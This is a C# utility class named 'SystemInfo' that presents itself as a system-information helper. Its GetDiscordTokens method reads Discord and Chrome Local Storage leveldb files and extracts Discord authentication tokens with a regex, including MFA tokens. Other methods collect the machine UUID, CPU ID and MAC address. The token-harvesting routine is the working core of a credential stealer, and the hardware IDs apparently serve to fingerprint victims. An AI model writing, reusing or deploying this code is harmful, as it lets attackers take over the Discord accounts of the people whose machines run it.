using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.NetworkInformation;
using System.Management;
using System.Linq;

namespace octonev2.Utils
{
    public static class SystemInfo
    {
        public static string GetDiscordTokens()
        {
            var tokens = new List<string>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var paths = new[] {
        Path.Combine(roamingAppData, "Discord", "Local Storage", "leveldb"),
        Path.Combine(roamingAppData, "discordcanary", "Local Storage", "leveldb"),
        Path.Combine(roamingAppData, "discordptb", "Local Storage", "leveldb"),
        Path.Combine(localAppData, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
    };

            foreach (var path in paths)
            {
                if (Directory.Exists(path))
                {
                    foreach (var file in Directory.GetFiles(path, "*.ldb"))
                    {
                        string content = File.ReadAllText(file);
                        foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                        {
                            tokens.Add(match.Value);
                        }
                    }
                }
            }

            return string.Join(",", tokens.Distinct());
        }


        public static string GetMachineId()
        {
            try
            {
                using var mc = new ManagementClass("Win32_ComputerSystemProduct");
                using var moc = mc.GetInstances();

                foreach (var mo in moc)
                {
                    return mo["UUID"].ToString();
                }
            }
            catch
            {
                return Environment.MachineName;
            }
            return Environment.MachineName;
        }

        public static string GetCpuId()
        {
            try
            {
                using var mc = new ManagementClass("Win32_Processor");
                using var moc = mc.GetInstances();

                foreach (var mo in moc)
                {
                    return mo["ProcessorId"].ToString();
                }
            }
            catch
            {
                return "Unknown CPU";
            }
            return "Unknown CPU";
        }

        public static string GetMacAddress()
        {
            try
            {
                return NetworkInterface
                    .GetAllNetworkInterfaces()
                    .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    .Select(nic => nic.GetPhysicalAddress().ToString())
                    .FirstOrDefault() ?? "Unknown MAC";
            }
            catch
            {
                return "Unknown MAC";
            }
        }
    }
}
